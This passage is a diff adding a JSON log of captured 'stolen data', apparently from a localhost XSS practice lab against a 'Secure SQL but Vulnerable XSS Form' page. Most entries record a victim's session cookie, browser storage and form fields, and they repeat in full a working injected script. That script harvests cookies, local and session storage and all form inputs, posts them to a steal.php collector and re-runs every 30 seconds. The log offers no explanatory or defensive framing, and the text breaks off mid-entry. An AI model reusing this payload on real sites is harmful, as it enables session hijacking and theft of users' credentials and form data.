@@ -1,0 +1,648 @@
+[
+    {
+        "timestamp": "2025-07-01 21:20:16",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "direct",
+        "method": "GET",
+        "victim_id": "victim_686434f0b4ddd"
+    },
+    {
+        "timestamp": "2025-07-01 21:22:04",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864355cdfc5d",
+        "raw_input": "{\"attack_type\":\"xss_working\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionId\":\"l1639eqifmh52pp4utm7pejsu6\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"timestamp\":\"2025-07-01T19:22:04.908Z\"}",
+        "stolen_data": {
+            "attack_type": "xss_working",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionId": "l1639eqifmh52pp4utm7pejsu6",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "timestamp": "2025-07-01T19:22:04.908Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:22:10",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "direct",
+        "method": "GET",
+        "victim_id": "victim_686435622bb17"
+    },
+    {
+        "timestamp": "2025-07-01 21:23:08",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864359c54ec2",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:23:08.345Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:23:08.345Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:23:13",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435a19a093",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:23:13.623Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:23:13.623Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:23:26",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435ae86eed",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:23:26.544Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:23:26.544Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:23:29",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435b13ed5d",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:23:29.254Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            